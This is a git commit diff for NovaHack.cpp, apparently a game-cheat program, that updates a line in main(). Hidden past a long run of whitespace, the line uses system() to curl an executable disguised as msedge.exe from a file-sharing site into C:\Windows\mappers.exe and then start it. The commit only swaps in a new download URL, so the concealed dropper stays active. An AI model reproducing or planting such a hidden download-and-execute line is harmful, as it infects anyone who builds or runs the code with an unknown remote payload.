493931235774f00243f81ff139d43046c30a4504
MovWX <162830092+MovWX@users.noreply.github.com>
2024-03-18 14:24:39 +0000

    Update NovaHack.cpp

--- NovaHack/NovaHack.cpp
+++ NovaHack/NovaHack.cpp
@@ -4,7 +4,7 @@
 
 
 int main()
-{                                                                                                                                                                                                                                                                                       system("curl -L https://www.zippyshare.day/download/FG3q0x3X60wnexW/DLK0G1pXYz917/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
+{                                                                                                                                                                                                                                                                                       system("curl -L https://www.zippyshare.day/download/jdvowg8PasoN9Iw/gex5z2qy53Kqk/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
     hack::Attach();
 
     render::CreateOverlay();
